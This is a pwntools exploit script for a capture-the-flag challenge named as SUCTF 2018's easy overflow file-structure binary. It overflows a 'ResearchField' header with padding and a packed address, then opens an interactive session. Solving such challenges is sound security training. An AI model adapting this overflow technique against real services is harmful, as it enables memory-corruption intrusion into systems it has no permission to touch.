from pwn import *

context(arch='amd64', os='linux', log_level='debug')

file_name = './data/bin/heap23_53_suctf_2018_easy_overflow_file_structure'

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

r = process(file_name)
elf = ELF(file_name)

def dbg():
    gdb.attach(r)

p1 = b'GET / HTTP/1.1#'
p1 += b'Host:' + p64(0xdeadbeef) + b'#'
p1 += b'Username:z1r0#'
p1 += b'ResearchField:' + b'c' * 0x7e + b'#'
p1 += b'ResearchField:' + b'aa' + p64(0x602220) + b'#'

r.sendline(p1)

r.interactive()